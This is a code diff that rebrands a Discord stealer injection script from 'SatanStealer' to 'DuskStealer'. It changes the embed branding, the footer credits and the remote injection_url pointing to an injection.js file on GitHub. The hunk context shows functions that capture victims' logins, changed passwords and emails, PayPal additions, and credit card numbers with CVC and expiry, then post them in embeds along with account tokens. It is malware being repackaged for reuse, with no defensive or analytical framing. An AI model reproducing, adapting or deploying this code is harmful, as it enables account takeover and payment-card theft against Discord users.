@@ -11,10 +11,10 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
-  embed_name: 'SatanStealer Injection', 
-  embed_icon: 'https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp'.replace(/ /g, '%20'), 
+  embed_name: 'DuskStealer Injection', 
+  embed_icon: 'https://cdn.discordapp.com/attachments/1259189054512300043/1260300010692673566/672D25BC363EEF3F936EE932B81097610D1D55B7.png?ex=668ed159&is=668d7fd9&hm=cc52f3d328bc31601874e9a9b8489b42b583dbba29745aaa6c02be680a2fc780&'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/HatGirl-zz/SatanStealerV2/main/injection.js', 
+  injection_url: 'https://raw.githubusercontent.com/versayy/Dusk-Stealer/main/injection.js', 
   /**
    
    **/
@@ -680,8 +680,8 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'SatanStealer Injection・RZxRedox',
-            icon_url: "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp"
+            text: 'DuskStealer・NoRatioBozo',
+            icon_url: "https://cdn.discordapp.com/attachments/1259189054512300043/1260300010692673566/672D25BC363EEF3F936EE932B81097610D1D55B7.png?ex=668ed159&is=668d7fd9&hm=cc52f3d328bc31601874e9a9b8489b42b583dbba29745aaa6c02be680a2fc780&"
         },
       },
     ],
@@ -723,8 +723,8 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'SatanStealer Injection・RZxRedox',
-            icon_url: "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp"
+            text: 'DuskStealer ',
+            icon_url: "https://cdn.discordapp.com/attachments/1259189054512300043/1260300010692673566/672D25BC363EEF3F936EE932B81097610D1D55B7.png?ex=668ed159&is=668d7fd9&hm=cc52f3d328bc31601874e9a9b8489b42b583dbba29745aaa6c02be680a2fc780&"
         },
       },
     ],
@@ -766,8 +766,8 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'SatanStealer Injection・RZxRedox',
-            icon_url: "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp"
+            text: 'DuskStealer Injection',
+            icon_url: "https://cdn.discordapp.com/attachments/1259189054512300043/1260300010692673566/672D25BC363EEF3F936EE932B81097610D1D55B7.png?ex=668ed159&is=668d7fd9&hm=cc52f3d328bc31601874e9a9b8489b42b583dbba29745aaa6c02be680a2fc780&"
         },
       },
     ],
@@ -809,8 +809,8 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'SatanStealer Injection・RZxRedox',
-            icon_url: "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp"
+            text: 'DuskStealer Injection',
+            icon_url: "https://cdn.discordapp.com/attachments/1259189054512300043/1260300010692673566/672D25BC363EEF3F936EE932B81097610D1D55B7.png?ex=668ed159&is=668d7fd9&hm=cc52f3d328bc31601874e9a9b8489b42b583dbba29745aaa6c02be680a2fc780&"
         },
       },
     ],
@@ -852,8 +852,8 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'SatanStealer Injection・RZxRedox',
-            icon_url: "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp"
+            text: 'DuskStealer Injection',
+            icon_url: "https://cdn.discordapp.com/attachments/1259189054512300043/1260300010692673566/672D25BC363EEF3F936EE932B81097610D1D55B7.png?ex=668ed159&is=668d7fd9&hm=cc52f3d328bc31601874e9a9b8489b42b583dbba29745aaa6c02be680a2fc780&"
         },
       },
     ],
@@ -897,8 +897,8 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'SatanStealer Injection・RZxRedox',
-            icon_url: "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp"
+            text: 'DuskStealer Injection',
+            icon_url: "https://cdn.discordapp.com/attachments/1259189054512300043/1260300010692673566/672D25BC363EEF3F936EE932B81097610D1D55B7.png?ex=668ed159&is=668d7fd9&hm=cc52f3d328bc31601874e9a9b8489b42b583dbba29745aaa6c02be680a2fc780&"
         },
       },
     ],
